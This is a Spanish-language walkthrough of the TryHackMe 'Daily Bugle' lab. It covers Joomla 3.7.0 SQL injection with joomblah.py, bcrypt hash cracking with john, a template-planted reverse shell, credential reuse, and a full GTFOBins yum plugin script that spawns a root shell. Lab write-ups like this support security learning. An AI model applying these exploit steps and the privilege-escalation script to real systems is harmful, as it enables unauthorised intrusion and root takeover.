# Daily Bugle - rmartinez 19/01/2022

IP: 10.10.157.67

## 1. Deploy

Empezamos reconocimiento inicial con nmap. Encontramos dos puertos:

- 22 SSH, no nos interesa por el momento.
- 80 Apache 2.4.6 con algumas disallowed entries, vamos a empezar por aquí:

- -| /joomla/administrator/ /administrator/ /bin/ /cache/ 
- -| /cli/ /components/ /includes/ /installation/ /language/ 
- -|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/

Access the web server, who robbed the bank?

```
Spiderman
```

## 2. Obtain user and root

What is the Joomla version?

Haciendo un poco de research en Google vemos como hallar la versión de Joomla, en este caso nos ha servido el fichero /language/en-GB/en-GB.xml que nos ha dicho la versión, en este caso
la 3.7.0. Buscamos en exploit-db un exploit para esta versión y encontramos una SQLi usando el parámetro ?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexmlCODIGOSQL

What is Jonah's cracked password?

Buscamos un exploit para Joomla 3.7.0 y encontramos un script de python joomblah.py. Lo arrancamos pero no funciona, y vemos una PR que tiene un fix. Aplicamos el fix, runeamos el script, y nos saca el usuario de la BD:

```
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Con SQLMap también conseguimos sacar todas las tablas.

Vemos que tiene un hash de bcrypt, por lo que usaremos john con rockyou para crackear el hash:

```
echo "$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm" > hash.txt
/opt/john/john --wordlist=/opt/wordlists/rockyou.txt hash.txt --format=bcrypt

La password es: spiderman123
```

Entramos en el panel de administración de joomla, vamos a templates, seleccionamos la que está puesta, modificamos el index.php y le cascamos la revshell de Pentestmonkey.

Al entrar vemos que no tenemos permisos para ver la flag de user en /home/jjameson/user.txt, por lo que tenemos que obtener las credenciales de ese usuario o en su defecto conseguir una privesc.

Las credenciales de usuario estaban en configuration.php del /var/www/html. En realidad estaba configurada como la pass de mysql, pero intentamos hacer una reutilización de credenciales y conseguimos acceso.

Para escalar privilegios con el nuevo usuario, comprobamos los permisos con:
```
sudo -l
```
y vemos que tiene permisos de root en el binario yum. 

Entramos en GTFObins y vemos que podemos mantener los privilegios y spawnear una shell con el bloque de código nº 2:

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Y gg pwn3d.